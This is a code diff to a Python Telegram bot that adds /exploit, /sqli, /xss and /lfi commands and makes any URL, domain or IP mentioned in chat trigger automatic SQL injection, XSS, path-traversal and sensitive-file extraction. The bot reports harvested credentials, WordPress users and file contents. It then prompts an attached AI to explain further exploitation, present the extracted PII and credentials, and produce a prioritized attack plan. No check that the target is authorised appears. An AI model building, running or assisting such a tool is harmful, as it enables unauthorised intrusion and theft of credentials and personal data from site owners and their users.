@@ -25,7 +25,8 @@ from tools import (
     subnet_calc, get_ports_table, port_info,
     phone_lookup, email_osint, username_search, domain_recon,
     web_scan, dir_scan, whois_lookup, shodan_search, ssl_check,
-    crawl_links,
+    crawl_links, sqli_test, xss_test, lfi_test,
+    extract_sensitive_files, full_exploit,
 )
 from db import Database
 
@@ -83,6 +84,10 @@ class TelegramBot:
             ("crawl", self.cmd_crawl),
             ("tool", self.cmd_tool),
             ("scan", self.cmd_scan),
+            ("exploit", self.cmd_exploit),
+            ("sqli", self.cmd_sqli),
+            ("xss", self.cmd_xss),
+            ("lfi", self.cmd_lfi),
             ("privesc", self.cmd_privesc),
             ("shells", self.cmd_shells),
             ("ctf", self.cmd_ctf),
@@ -713,6 +718,175 @@ Examples: /tool nmap, /tool burpsuite, /tool metasploit, /tool sqlmap, /tool hyd
         result = await self.ai.analyze_target(args)
         await self._send(update, f"🎯 <b>RECON PLAN</b>\n\n{esc(result)}")
 
+    async def cmd_exploit(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Full exploitation suite on a URL"""
+        if not self._auth(update.effective_user.id):
+            return
+        args = " ".join(context.args) if context.args else ""
+        if not args:
+            await self._send(update, "Usage: /exploit [url]\nExample: /exploit https://example.com\n\nRuns ALL tools: web scan, SQLi, XSS, LFI, dir brute, file extraction, SSL, Shodan")
+            return
+        target = args.strip()
+        if not target.startswith("http"):
+            target = f"https://{target}"
+        await update.message.reply_text(f"💀 Running FULL exploitation suite on {target}...\n⚡ SQLi + XSS + LFI + Dir Brute + File Extract + Recon")
+        uid = update.effective_user.id
+        try:
+            result = await full_exploit(target)
+            report = f"💀 <b>FULL EXPLOITATION REPORT</b>\n🎯 Target: {esc(target)}\n\n"
+
+            # Web scan findings
+            ws = result.get("web_scan", {})
+            if ws.get("findings"):
+                report += f"🔒 <b>Vulnerabilities ({len(ws['findings'])}):</b>\n"
+                for f in ws["findings"]:
+                    report += f"  [{f['severity']}] {esc(f['type'])}: {esc(f['detail'])}\n"
+            if ws.get("exploits"):
+                report += f"\n💀 <b>Extracted Data ({len(ws['exploits'])}):</b>\n"
+                for ex in ws["exploits"]:
+                    report += f"  🔴 {esc(ex['type'])}:\n"
+                    if isinstance(ex.get("data"), list):
+                        for item in ex["data"][:8]:
+                            report += f"    → {esc(str(item))}\n"
+                    elif ex.get("data"):
+                        report += f"    → {esc(str(ex['data']))}\n"
+
+            # SQLi
+            sq = result.get("sqli", {})
+            if sq.get("sqli_vulnerable"):
+                report += f"\n💉 <b>SQL INJECTION — VULNERABLE!</b>\n"
+                for v in sq.get("vulnerable_params", []):
+                    report += f"  Param: {esc(v['param'])} | Payload: {esc(v['payload'])}\n"
+                for v in sq.get("vulnerable_forms", []):
+                    report += f"  Form: {esc(v['action'])} | Payload: {esc(v['payload'])}\n"
+            else:
+                report += "\n💉 SQLi: Not vulnerable\n"
+
+            # XSS
+            xs = result.get("xss", {})
+            if xs.get("xss_vulnerable"):
+                report += f"\n⚡ <b>XSS — VULNERABLE!</b>\n"
+                for v in xs.get("vulnerable_params", []) + xs.get("vulnerable_forms", []):
+                    report += f"  Payload: {esc(v['payload'])}\n"
+            else:
+                report += "\n⚡ XSS: Not vulnerable\n"
+
+            # LFI
+            lf = result.get("lfi", {})
+            if lf.get("lfi_vulnerable"):
+                report += f"\n📁 <b>LFI — VULNERABLE!</b>\n"
+                for f in lf.get("files_read", []):
+                    report += f"  File: {esc(f['file'])}\n  Content: {esc(f['content_preview'][:200])}\n"
+            else:
+                report += "\n📁 LFI: Not vulnerable\n"
+
+            # Sensitive files
+            sf = result.get("sensitive_files", {})
+            if sf.get("extracted_files"):
+                report += f"\n🔓 <b>Sensitive Files ({len(sf['extracted_files'])}):</b>\n"
+                for ef in sf["extracted_files"]:
+                    report += f"  📄 {esc(ef['path'])}\n"
+                    if ef.get("credentials_found"):
+                        for k, v in ef["credentials_found"].items():
+                            report += f"    🔑 {esc(k)} = {esc(v)}\n"
+
+            # Crawl
+            cr = result.get("crawl", {})
+            if cr.get("emails"):
+                report += f"\n📧 Emails: {', '.join(esc(e) for e in cr['emails'][:10])}\n"
+
+            await self._send(update, report)
+
+            # Also send to AI for analysis
+            self.db.save_message(uid, "user", f"/exploit {target}")
+            enriched = f"Analyze these exploitation results for {target} and give a prioritized attack plan:\n{report}"
+            history = self.db.get_conversation(uid, limit=5)
+            ai_resp = await self.ai.chat(enriched, history)
+            self.db.save_message(uid, "assistant", ai_resp)
+            await self._send(update, f"🧠 <b>AI ANALYSIS:</b>\n\n{esc(ai_resp)}")
+        except Exception as e:
+            await self._send(update, f"⚠️ Exploit error: {esc(str(e))}")
+
+    async def cmd_sqli(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Test SQL injection on a URL"""
+        if not self._auth(update.effective_user.id):
+            return
+        args = " ".join(context.args) if context.args else ""
+        if not args:
+            await self._send(update, "Usage: /sqli [url with params]\nExample: /sqli https://example.com/page?id=1")
+            return
+        target = args.strip()
+        if not target.startswith("http"):
+            target = f"https://{target}"
+        await update.message.reply_text(f"💉 Testing SQL injection on {target}...")
+        try:
+            result = await sqli_test(target)
+            if result.get("sqli_vulnerable"):
+                report = "💉 <b>SQL INJECTION — VULNERABLE!</b>\n\n"
+                for v in result.get("vulnerable_params", []):
+                    report += f"Param: <b>{esc(v['param'])}</b>\nPayload: <code>{esc(v['payload'])}</code>\nEvidence: {esc(v['evidence'])}\n\n"
+                for v in result.get("vulnerable_forms", []):
+                    report += f"Form: <b>{esc(v['action'])}</b>\nPayload: <code>{esc(v['payload'])}</code>\nEvidence: {esc(v['evidence'])}\n\n"
+            else:
+                report = "💉 No SQL injection vulnerabilities detected.\n"
+                if result.get("params_tested"):
+                    report += f"Params tested: {', '.join(result['params_tested'])}\n"
+                if result.get("forms_tested"):
+                    report += f"Forms tested: {result['forms_tested']}\n"
+            await self._send(update, report)
+        except Exception as e:
+            await self._send(update, f"⚠️ Error: {esc(str(e))}")
+
+    async def cmd_xss(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Test XSS on a URL"""
+        if not self._auth(update.effective_user.id):
+            return
+        args = " ".join(context.args) if context.args else ""
+        if not args:
+            await self._send(update, "Usage: /xss [url]\nExample: /xss https://example.com/search?q=test")
+            return
+        target = args.strip()
+        if not target.startswith("http"):
+            target = f"https://{target}"
+        await update.message.reply_text(f"⚡ Testing XSS on {target}...")
+        try:
+            result = await xss_test(target)
+            if result.get("xss_vulnerable"):
+                report = "⚡ <b>XSS — VULNERABLE!</b>\n\n"
+                for v in result.get("vulnerable_params", []) + result.get("vulnerable_forms", []):
+                    report += f"Type: <b>{esc(v.get('type', 'reflected'))}</b>\nPayload: <code>{esc(v['payload'])}</code>\n\n"
+            else:
+                report = "⚡ No XSS vulnerabilities detected.\n"
+            await self._send(update, report)
+        except Exception as e:
+            await self._send(update, f"⚠️ Error: {esc(str(e))}")
+
+    async def cmd_lfi(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Test LFI/path traversal on a URL"""
+        if not self._auth(update.effective_user.id):
+            return
+        args = " ".join(context.args) if context.args else ""
+        if not args:
+            await self._send(update, "Usage: /lfi [url with params]\nExample: /lfi https://example.com/page?file=home")
+            return
+        target = args.strip()
+        if not target.startswith("http"):
+            target = f"https://{target}"
+        await update.message.reply_text(f"📁 Testing LFI/path traversal on {target}...")
+        try:
+            result = await lfi_test(target)
+            if result.get("lfi_vulnerable"):
+                report = "📁 <b>LFI/PATH TRAVERSAL — VULNERABLE!</b>\n\n"
+                for v in result.get("vulnerable_params", []):
+                    report += f"Param: <b>{esc(v['param'])}</b>\nPayload: <code>{esc(v['payload'])}</code>\n\n"
+                for f in result.get("files_read", []):
+                    report += f"📄 <b>{esc(f['file'])}</b>:\n<code>{esc(f['content_preview'][:500])}</code>\n\n"
+            else:
+                report = "📁 No LFI/path traversal vulnerabilities detected.\n"
+            await self._send(update, report)
+        except Exception as e:
+            await self._send(update, f"⚠️ Error: {esc(str(e))}")
+
     async def cmd_privesc(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Privilege escalation checklist"""
         if not self._auth(update.effective_user.id):
@@ -816,7 +990,7 @@ Examples:
     # ── Free-form Chat ──
 
     async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle any text — auto-detect targets and run real tools, then route to AI."""
+        """Handle any text — auto-detect targets, run FULL exploitation, then route to AI."""
         if not self._auth(update.effective_user.id):
             return
         uid = update.effective_user.id
@@ -827,14 +1001,10 @@ Examples:
         self.db.save_message(uid, "user", message)
 
         # ── Auto-detect URLs, domains, and IPs in the message ──
-        # URL pattern
         urls = re.findall(r'https?://[^\s<>"\']+', message, re.IGNORECASE)
-        # Domain pattern (word.tld or sub.word.tld)
         domains = re.findall(r'\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+(?:com|net|org|io|dev|co|info|biz|edu|gov|me|app|xyz|tech|site|online|cloud|ai|ru|uk|de|fr|jp|kr|cn|in|br|au|ca|nl|se|no|fi|dk|es|it|pt|pl|cz|ro|hu|bg|hr|sk|si|lt|lv|ee|ie|at|ch|be|lu|za|mx|ar|cl|pe|co\.uk|com\.au|co\.jp|co\.kr|com\.br)\b', message, re.IGNORECASE)
-        # IP pattern
         ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', message)
 
-        # Deduplicate targets
         targets = []
         seen = set()
         for u in urls:
@@ -851,101 +1021,162 @@ Examples:
                 seen.add(ip)
                 targets.append(("ip", ip))
 
-        # ── If targets found, auto-run real tools ──
+        # ── If targets found, run FULL exploitation ──
         tool_results = ""
         if targets:
-            await update.message.reply_text(f"🔍 Detected {len(targets)} target(s) — running scans...")
-            for ttype, target in targets[:3]:  # Max 3 targets per message
+            await update.message.reply_text(
+                f"🔍 Detected {len(targets)} target(s) — running full exploitation suite...\n"
+                f"⚡ Web scan + SQLi + XSS + LFI + Dir brute + File extraction + SSL + Shodan"
+            )
+            for ttype, target in targets[:2]:  # Max 2 targets
                 try:
-                    if ttype == "url":
-                        # Run web_scan + dir_scan
-                        scan = await web_scan(target)
-                        dirs = await dir_scan(target)
-                        tool_results += f"\n\n{'='*40}\n🌐 WEB SCAN: {target}\n{'='*40}\n"
-                        if scan.get("findings"):
-                            for f in scan["findings"]:
-                                tool_results += f"[{f['severity']}] {f['type']}: {f['detail']}\n"
-                        else:
-                            tool_results += "No vulnerabilities found.\n"
-                        if dirs.get("files_found"):
-                            interesting = [f for f in dirs["files_found"] if f.get("interesting")]
-                            if interesting:
-                                tool_results += f"\n📂 Exposed files/dirs ({len(interesting)} found):\n"
-                                for f in interesting:
-                                    tool_results += f"  [{f['status']}] {f['path']} ({f['size']} bytes)\n"
+                    target_url = target if target.startswith("http") else f"https://{target}"
+                    tool_results += f"\n\n{'='*50}\n🎯 FULL EXPLOITATION: {target}\n{'='*50}\n"
 
-                    elif ttype == "domain":
-                        # Run domain_recon + web_scan + dir_scan + ssl_check + shodan
-                        recon = await domain_recon(target)
-                        scan = await web_scan(target)
-                        dirs = await dir_scan(target)
-                        ssl = await ssl_check(target)
-                        shod = await shodan_search(target)
-
-                        tool_results += f"\n\n{'='*40}\n🎯 FULL RECON: {target}\n{'='*40}\n"
-
-                        # Recon results
+                    if ttype in ("domain", "url"):
+                        # ── Recon ──
+                        recon = await domain_recon(target if ttype == "domain" else target_url.split("//")[1].split("/")[0])
                         if recon.get("ips"):
-                            tool_results += f"IPs: {', '.join(recon['ips'])}\n"
+                            tool_results += f"\n📡 IPs: {', '.join(recon['ips'])}"
                         if recon.get("server"):
-                            tool_results += f"Server: {recon['server']}\n"
+                            tool_results += f"\n🖥 Server: {recon['server']}"
                         if recon.get("technologies"):
-                            tool_results += f"Tech Stack: {', '.join(recon['technologies'])}\n"
+                            tool_results += f"\n🔧 Tech: {', '.join(recon['technologies'])}"
                         if recon.get("security_headers"):
                             missing = [k for k, v in recon["security_headers"].items() if v == "MISSING"]
                             if missing:
-                                tool_results += f"Missing Security Headers: {', '.join(missing)}\n"
+                                tool_results += f"\n⚠️ Missing Headers: {', '.join(missing)}"
                         if recon.get("hosting"):
                             h = recon["hosting"]
-                            tool_results += f"Hosting: {h.get('isp', '?')} ({h.get('country', '?')})\n"
+                            tool_results += f"\n🌍 Hosting: {h.get('isp', '?')} ({h.get('country', '?')})"
 
-                        # Web scan
+                        # ── Web Scan + PII Extraction ──
+                        scan = await web_scan(target_url)
                         if scan.get("findings"):
-                            tool_results += f"\n🔒 Vulnerability Scan ({len(scan['findings'])} findings):\n"
+                            tool_results += f"\n\n🔒 VULNERABILITY SCAN ({len(scan['findings'])} findings):\n"
                             for f in scan["findings"]:
                                 tool_results += f"  [{f['severity']}] {f['type']}: {f['detail']}\n"
+                        if scan.get("exploits"):
+                            tool_results += f"\n💀 EXPLOITATION RESULTS ({len(scan['exploits'])} extractions):\n"
+                            for ex in scan["exploits"]:
+                                tool_results += f"  🔴 [{ex.get('severity', 'HIGH')}] {ex['type']}:\n"
+                                if ex.get("data"):
+                                    if isinstance(ex["data"], list):
+                                        for item in ex["data"][:10]:
+                                            tool_results += f"    → {item}\n"
+                                    else:
+                                        tool_results += f"    → {ex['data']}\n"
+                                if ex.get("count"):
+                                    tool_results += f"    Total found: {ex['count']}\n"
+                                if ex.get("fields"):
+                                    tool_results += f"    Fields: {', '.join(ex['fields'])}\n"
 
-                        # Dir scan
-                        if dirs.get("files_found"):
-                            interesting = [f for f in dirs["files_found"] if f.get("interesting")]
-                            if interesting:
-                                tool_results += f"\n📂 Exposed files ({len(interesting)}):\n"
-                                for f in interesting:
-                                    tool_results += f"  [{f['status']}] {f['path']} ({f['size']} bytes)\n"
-
-                        # SSL
-                        if not ssl.get("error"):
-                            tool_results += f"\n🔐 SSL: expires in {ssl.get('days_until_expiry', '?')} days"
-                            tool_results += f" | {ssl.get('version', '?')}\n"
-                            if ssl.get("expired"):
-                                tool_results += "  ⚠️ CERTIFICATE IS EXPIRED!\n"
+                        # ── SQL Injection Testing ──
+                        sqli = await sqli_test(target_url)
+                        if sqli.get("sqli_vulnerable"):
+                            tool_results += f"\n💉 SQL INJECTION — VULNERABLE!\n"
+                            for v in sqli.get("vulnerable_params", []):
+                                tool_results += f"  🔴 Param: {v['param']} | Payload: {v['payload']}\n"
+                                tool_results += f"     Evidence: {v['evidence']}\n"
+                            for v in sqli.get("vulnerable_forms", []):
+                                tool_results += f"  🔴 Form #{v['form']} ({v['method']} {v['action']})\n"
+                                tool_results += f"     Payload: {v['payload']} | Evidence: {v['evidence']}\n"
                         else:
-                            tool_results += f"\n🔐 SSL Error: {ssl['error']}\n"
+                            tool_results += f"\n💉 SQLi: No vulnerabilities detected\n"
 
-                        # Shodan
+                        # ── XSS Testing ──
+                        xss = await xss_test(target_url)
+                        if xss.get("xss_vulnerable"):
+                            tool_results += f"\n⚡ XSS — VULNERABLE!\n"
+                            for v in xss.get("vulnerable_params", []):
+                                tool_results += f"  🔴 Param: {v['param']} | Type: {v['type']}\n"
+                                tool_results += f"     Payload: {v['payload']}\n"
+                            for v in xss.get("vulnerable_forms", []):
+                                tool_results += f"  🔴 Form #{v['form']} | Type: {v['type']}\n"
+                                tool_results += f"     Payload: {v['payload']}\n"
+                        else:
+                            tool_results += f"\n⚡ XSS: No reflected XSS detected\n"
+
+                        # ── LFI / Path Traversal ──
+                        lfi = await lfi_test(target_url)
+                        if lfi.get("lfi_vulnerable"):
+                            tool_results += f"\n📁 LFI/PATH TRAVERSAL — VULNERABLE!\n"
+                            for v in lfi.get("vulnerable_params", []):
+                                tool_results += f"  🔴 Param: {v['param']} | Payload: {v['payload']}\n"
+                            for fr in lfi.get("files_read", []):
+                                tool_results += f"  📄 File read: {fr['file']}\n"
+                                tool_results += f"     Content: {fr['content_preview'][:300]}\n"
+                        else:
+                            tool_results += f"\n📁 LFI: No path traversal detected\n"
+
+                        # ── Directory Bruteforce + Sensitive File Extraction ──
+                        dirs = await dir_scan(target_url)
+                        files = await extract_sensitive_files(target_url)
+                        if dirs.get("files_found"):
+                            interesting = [fi for fi in dirs["files_found"] if fi.get("interesting")]
+                            if interesting:
+                                tool_results += f"\n📂 EXPOSED FILES ({len(interesting)} found):\n"
+                                for fi in interesting:
+                                    tool_results += f"  [{fi['status']}] {fi['path']} ({fi['size']} bytes)\n"
+                        if files.get("extracted_files"):
+                            tool_results += f"\n🔓 SENSITIVE FILE CONTENTS EXTRACTED:\n"
+                            for ef in files["extracted_files"]:
+                                tool_results += f"\n  📄 {ef['path']} ({ef['size']} bytes):\n"
+                                if ef.get("credentials_found"):
+                                    tool_results += f"  🔑 CREDENTIALS FOUND:\n"
+                                    for k, v in ef["credentials_found"].items():
+                                        tool_results += f"    {k} = {v}\n"
+                                if ef.get("wp_users"):
+                                    tool_results += f"  👤 WORDPRESS USERS:\n"
+                                    for u in ef["wp_users"]:
+                                        tool_results += f"    ID:{u['id']} | {u['name']} | {u['slug']}\n"
+                                if ef.get("git_info"):
+                                    tool_results += f"  🔧 GIT INFO:\n"
+                                    for k, v in ef["git_info"].items():
+                                        tool_results += f"    {k}: {v}\n"
+                                if not ef.get("credentials_found") and not ef.get("wp_users") and not ef.get("git_info"):
+                                    tool_results += f"  Content:\n    {ef['content_preview'][:500]}\n"
+
+                        # ── SSL + Shodan ──
+                        domain_for_ssl = target if ttype == "domain" else target_url.split("//")[1].split("/")[0].split(":")[0]
+                        ssl = await ssl_check(domain_for_ssl)
+                        if not ssl.get("error"):
+                            tool_results += f"\n🔐 SSL: {ssl.get('version', '?')} | Expires in {ssl.get('days_until_expiry', '?')} days"
+                            if ssl.get("expired"):
+                                tool_results += " ⚠️ EXPIRED!"
+                            tool_results += "\n"
+                        shod = await shodan_search(domain_for_ssl)
                         if shod and "No Shodan data" not in shod and "error" not in shod.lower():
                             tool_results += f"\n📡 Shodan:\n{shod}\n"
 
+                        # ── Link/Email Crawl ──
+                        crawl = await crawl_links(target_url)
+                        if crawl.get("emails"):
+                            tool_results += f"\n📧 Crawled Emails: {', '.join(crawl['emails'][:10])}\n"
+                        if crawl.get("social_links"):
+                            tool_results += f"\n📱 Social Links: {', '.join(crawl['social_links'][:5])}\n"
+
                     elif ttype == "ip":
-                        # Run shodan + IP lookup
                         shod = await shodan_search(target)
                         ip_info = await ip_lookup(target)
-
-                        tool_results += f"\n\n{'='*40}\n📡 IP SCAN: {target}\n{'='*40}\n"
-                        if ip_info:
-                            tool_results += f"IP Info:\n{ip_info}\n"
+                        tool_results += f"\n📡 IP SCAN: {target}\n"
+                        if isinstance(ip_info, dict) and "error" not in ip_info:
+                            for k, v in ip_info.items():
+                                tool_results += f"  {k}: {v}\n"
                         if shod and "No Shodan data" not in shod:
                             tool_results += f"\nShodan:\n{shod}\n"
 
                 except Exception as e:
-                    tool_results += f"\n⚠️ Scan error for {target}: {str(e)}\n"
+                    tool_results += f"\n⚠️ Error scanning {target}: {str(e)}\n"
 
         # Build the prompt for AI
         if tool_results:
             enriched = (
                 f"{message}\n\n"
-                f"[REAL SCAN RESULTS — I ran actual security tools on the targets. "
-                f"Analyze these results and give actionable findings:]\n"
+                f"[REAL EXPLOITATION RESULTS — These are real scan results from actual security tools.\n"
+                f"Analyze every finding. For each vulnerability found, explain how to exploit it further.\n"
+                f"For any PII/credentials extracted, present them clearly.\n"
+                f"Give a severity rating and prioritized attack plan:]\n"
                 f"{tool_results}"
             )
         else:
